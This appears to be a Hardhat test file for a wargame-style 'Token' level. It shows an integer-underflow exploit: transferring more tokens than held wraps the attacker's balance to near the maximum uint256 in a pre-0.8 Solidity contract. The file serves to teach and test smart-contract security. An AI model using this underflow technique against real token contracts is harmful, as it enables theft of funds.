import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 05 - Token contract hack", () => {
    async function setUp() {
        const [hacker, Alice] = await ethers.getSigners();
        const initBalance = ethers.parseEther("20");

        const TokenContract = await ethers.getContractFactory("Token");
        const token = await TokenContract.deploy(initBalance);

        return {hacker, Alice, token, initBalance};
    };

    describe("When deploying", () => {
        it("Hacker should get 20 tokens at deployment (assuming 18-decimals)", async() => {
            const {hacker, Alice, token, initBalance} = await loadFixture(setUp);
            expect(await token.balanceOf(hacker.address)).to.equal(initBalance);
        });
    });

    describe("When hacking", () => {
        it("Hacker should hold more than 20 tokens by exploiting the underflow issue on the transfer() method", async() => {
            /*
             * The hacker initial token balance is set at 20 units. He'd like to hold a larger balance.
             * Given the lack of underflow checks -and a compiler lower than 0.8 version-, any transfer of > 20 token units will underflow its balance.
             * This implies that should the difference between the current balance and the transfer amount be negative, then his balance 
             * counter will resume from max uint256 (2 ** 256 - 1).
             * 
             * Therefore, by just transferring an amount larger than 20 tokens, he'll be entitled to a larger balance.
            **/
            const {hacker, Alice, token, initBalance} = await loadFixture(setUp);
            
            expect(await token.balanceOf(hacker.address)).to.equal(initBalance);
            
            await token.connect(hacker).transfer(Alice.address, ethers.parseEther("25"));
            expect(await token.balanceOf(hacker.address)).to.equal(ethers.MaxUint256 - ethers.parseEther("5") + BigInt(1));
        });
    });
});